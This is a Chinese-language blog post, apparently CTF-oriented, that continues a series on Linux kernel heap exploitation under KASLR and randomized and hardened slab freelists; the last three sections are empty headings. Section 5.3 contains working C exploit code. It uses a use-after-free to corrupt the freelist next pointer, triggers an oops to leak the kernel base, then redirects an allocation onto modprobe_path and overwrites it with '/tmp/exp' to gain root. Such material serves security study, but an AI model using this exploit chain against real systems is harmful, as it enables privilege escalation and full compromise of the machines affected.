---
layout: post
tags: [kernel_pwn]
title: "kernel heap 3: 内核堆利用技巧综述 2"
author: wsxk
date: 2026-7-25
comments: true
---


- [5.3  kaslr + randomized freelist](#53--kaslr--randomized-freelist)
- [5.4 kaslr + randomized freelist + HARDENED freelist](#54-kaslr--randomized-freelist--hardened-freelist)
- [5.5](#55)
- [5.6](#56)
- [5.7](#57)


PS： 章节承接[https://wsxk.github.io/kernel_heap2/](https://wsxk.github.io/kernel_heap2/)<br>

## 5.3  kaslr + randomized freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
```
1、 通过kernel crash获取kernel基址信息。
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```
oops脚本:<br>
```c
    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr = 0x4141414141414141
    printf("step2\n");
    memset(buf,0x41,0x1d0);
    write_slot(fd,buf,0x1d0);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: trigger oops
    printf("step4\n");
    int fd3 = open_device();
```
第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
```c
    environ_set();
    //step 0: get kernel_base_addr: via Oops
    unsigned long long kernel_base_addr = 0;
    scanf("%llx",&kernel_base_addr);
    kernel_base_addr = kernel_base_addr - 0x58c20;
    printf("kernel_addr: %llx\n",kernel_base_addr);
    unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
    printf("modprobe_path addr: %llx\n",modprobe_addr);

    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr -> modprobe addr
    printf("step2\n");
    for(int i=0;i<=29;i++){
        memcpy(buf+8*i,(char *)&modprobe_addr,8);
    }
    write_slot(fd,buf,0x8*30);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: write modprobe_path
    printf("step4\n");
    int fd3 = open_device();
    memset(buf,0,0x100);
    memcpy(buf+0x100,"/tmp/exp\x00",10);
    write_slot(fd3,buf,0x100+10);

    get_flag();
```
这里有一个坑点，需要注意`modprobe_path`+0x100的位置为`kmod_concurrent_max`,这个结构体不能随意修改。<br>

## 5.4 kaslr + randomized freelist + HARDENED freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
加了`HARDENED freelist`机制后，之前篡改`next_ptr`会导致kernel panic。暂且不知道理由为何<br>
```
1、 通过kernel crash获取kernel基址信息。（这里需要先获取 s->random ^ swab(ptr_addr) ）的值，可以通过分配完一个slab中的所有slot，再释放slot a，这样a实际下一个堆块为null，所以a->free_list = s->random ^ swab(ptr_addr)
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```



## 5.5<br>


## 5.6<br>

## 5.7<br>








<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>